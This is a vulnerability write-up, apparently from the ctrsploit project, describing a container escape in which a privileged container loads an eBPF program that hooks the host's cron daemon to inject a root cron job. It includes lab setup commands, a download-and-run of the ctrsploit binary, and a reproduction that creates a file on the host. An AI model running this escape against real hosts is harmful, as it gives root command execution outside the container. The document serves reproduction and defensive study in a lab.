# ebpf escape by hooking cron process

## 1. Vulnerability Introduction

This vulnerability describes a container escape method that leverages eBPF.

When a container is granted excessive privileges (such as CAP_SYS_ADMIN or CAP_BPF), an attacker can load a malicious eBPF program into the host's kernel from within the container.

This eBPF program can inject evil job by hooking cron process.

## 2. Exploit Scenario

Insecure configuration

## 3. Prerequisites

vulnerability exists:
* CAP_BND: CAP_SYS_ADMIN / CAP_BPF

vulnerability exploitable:
* CAP_EFF: CAP_SYS_ADMIN

## 4. Vulnerability Existence Check

`ctrsploit checksec ebpf`

## 5. Reproduce

![](./video.svg)

### 5.1 Reproduce Environment

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/docker/v28.3.2-cron/
$ docker compose -f docker-compose.yml -f docker-compose.kvm up -d
```

<details><summary>env details</summary>

```shell
$ ./ssh
root@docker-28-3-2-cron:~# apt show cron
Package: cron
Version: 3.0pl1-184ubuntu2
Status: install ok installed
Priority: important
Section: admin
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Original-Maintainer: Georges Khaznadar <georgesk@debian.org>
Installed-Size: 236 kB
Provides: cron-daemon
Pre-Depends: init-system-helpers (>= 1.54~), cron-daemon-common
Depends: libc6 (>= 2.34), libpam0g (>= 0.99.7.1), libselinux1 (>= 3.1~), sensible-utils, libpam-runtime
Suggests: anacron, logrotate, checksecurity, supercat, default-mta | mail-transport-agent
Conflicts: bcron, cronie, systemd-cron
Replaces: bcron, cronie, systemd-cron
Homepage: https://ftp.isc.org/isc/cron/
Download-Size: unknown
APT-Manual-Installed: yes
APT-Sources: /var/lib/dpkg/status
Description: process scheduling daemon
 The cron daemon is a background process that runs particular programs at
 particular times (for example, every minute, day, week, or month), as
 specified in a crontab. By default, users may also create crontabs of
 their own so that processes are run on their behalf.
 .
 Output from the commands is usually mailed to the system administrator
 (or to the user in question); you should probably install a mail system
 as well so that you can receive these messages.
 .
 This cron package does not provide any system maintenance tasks. Basic
 periodic maintenance tasks are provided by other packages, such
 as checksecurity.

root@docker-28-3-2-cron:~# systemctl status cron
● cron.service - Regular background program processing daemon
Loaded: loaded (/usr/lib/systemd/system/cron.service; enabled; preset: enabled)
Active: active (running) since Wed 2025-10-08 10:04:14 UTC; 1min 17s ago
Docs: man:cron(8)
Main PID: 405 (cron)
Tasks: 1 (limit: 2330)
Memory: 440.0K (peak: 688.0K)
CPU: 6ms
CGroup: /system.slice/cron.service
└─405 /usr/sbin/cron -f -P

Oct 08 10:04:14 docker-28-3-2-cron systemd[1]: Started cron.service - Regular background program processing daemon.
Oct 08 10:04:14 docker-28-3-2-cron (cron)[405]: cron.service: Referenced but unset environment variable evaluates to an empty string: EXTRA_OPTS
Oct 08 10:04:14 docker-28-3-2-cron cron[405]: (CRON) INFO (pidfile fd = 3)
Oct 08 10:04:14 docker-28-3-2-cron cron[405]: (CRON) INFO (Running @reboot jobs)

root@docker-28-3-2-cron:~# docker version
Client: Docker Engine - Community
Version:           28.3.2
API version:       1.51
Go version:        go1.24.5
Git commit:        578ccf6
Built:             Wed Jul  9 16:13:45 2025
OS/Arch:           linux/amd64
Context:           default

Server: Docker Engine - Community
Engine:
Version:          28.3.2
API version:      1.51 (minimum version 1.24)
Go version:       go1.24.5
Git commit:       e77ff99
Built:            Wed Jul  9 16:13:45 2025
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.7.27
GitCommit:        05044ec0a9a75232cad458027ca83437aae3f4da
runc:
Version:          1.2.5
GitCommit:        v1.2.5-0-g59923ef
docker-init:
Version:          0.19.0
GitCommit:        de40ad0
root@docker-28-3-2-cron:~# containerd --version
containerd containerd.io 1.7.27 05044ec0a9a75232cad458027ca83437aae3f4da
root@docker-28-3-2-cron:~# cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.2 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo
root@docker-28-3-2-cron:~# uname -a
Linux docker-28-3-2-cron 6.8.0-85-generic #85-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep 18 15:26:59 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

</details>

### 5.2 Reproduce Steps

startup ebpf

```shell
$ ./ssh
root@docker-28-3-2-cron:~# docker run -ti --cap-add=CAP_SYS_ADMIN busybox:latest ash
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul caps sys_admin x ebpf cron -j "* * * * * root touch /escaped"
INFO[0000] set up job as: "* * * * * root touch /escaped #" 
INFO[0000] Waiting for events..                         
INFO[0046] pid: 404                                     
INFO[0046] pid: 404                                     
INFO[0046] pid: 404                                     
```

check /escaped file created

```shell
$ ./ssh
root@docker-28-3-2-cron:~# ls -lah /escaped 
-rw-r--r-- 1 root root 0 Oct 10 03:15 /escaped
```
